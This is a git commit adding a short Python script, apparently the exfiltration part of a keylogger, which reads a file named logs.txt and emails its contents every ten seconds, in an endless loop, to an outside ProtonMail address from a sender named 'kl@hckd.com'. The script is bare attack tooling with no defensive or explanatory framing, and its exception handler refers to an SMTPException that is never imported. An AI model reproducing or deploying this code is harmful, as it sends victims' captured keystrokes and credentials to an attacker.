abf252eb816538606a60a555f3e2a2a0219a2989
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-02-23 17:25:13 +0000

    Add files via upload

---
+++ mail.py
@@ -0,0 +1,23 @@
+import smtplib
+import time
+
+sender = "kl@hckd.com"
+
+receivers = ['blackhatcourse2020@protonmail.com']
+
+f = open("logs.txt", "r")
+
+message = (f.read())
+
+def executeSomething():
+    try:
+        smtpObj = smtplib.SMTP('localhost', 25)
+        smtpObj.sendmail(sender, receivers, message)
+        print("Sent!")
+    except SMTPException:
+        print("Error: unable to send email")
+
+    time.sleep(10)
+
+while True:
+    executeSomething()
